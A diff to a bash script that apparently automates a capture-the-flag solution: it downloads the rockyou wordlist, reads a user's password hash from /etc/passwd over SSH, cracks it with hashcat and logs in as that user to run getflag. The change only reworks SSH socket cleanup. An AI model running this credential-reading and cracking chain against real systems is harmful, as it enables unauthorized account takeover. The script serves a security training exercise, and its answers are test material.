@@ -195,17 +195,15 @@ main() {
 
     wordlist_path=$(download_rockyou_wordlist "$CURR_DIR_PATH/tshark/wordlists" || exit 1);
 
-    trap 'close_ssh_socket "$level01_socket_path" "$host" "$port" "$level01_username"' EXIT USR1;
     init_ssh_socket "$level01_socket_path" "$host" "$port" "$level01_username" "$level01_password" || exit 1;
     hashed_password=$(ssh_exec_via_socket "$level01_socket_path" "$host" "$port" "$level01_username" "cat /etc/passwd | grep ${flag01_username} | cut -d: -f2");
     flag01_password=$(hashcat_crack_hash "$hashed_password"  "$CURR_DIR_PATH/tshark/out" "$wordlist_path");
-    kill -USR1 $$;
+    close_ssh_socket "$level01_socket_path" "$host" "$port" "$level01_username";
 
-    trap 'close_ssh_socket "$flag01_socket_path" "$host" "$port" "$flag01_username"' EXIT USR1;
     init_ssh_socket "$flag01_socket_path" "$host" "$port" "$flag01_username" "$flag01_password" || exit 1;
     checkflag_str=$(ssh_exec_via_socket "$flag01_socket_path" "$host" "$port" "$flag01_username" "getflag");
     checkflag=$(echo -n "$checkflag_str" | head -n 1 | awk  '{print $NF}');
-    kill -USR1 $$;
+    close_ssh_socket "$flag01_socket_path" "$host" "$port" "$flag01_username";
 
     flag_outpath="$CURR_DIR_PATH/../flag";
     echo "Checkflag: $checkflag";
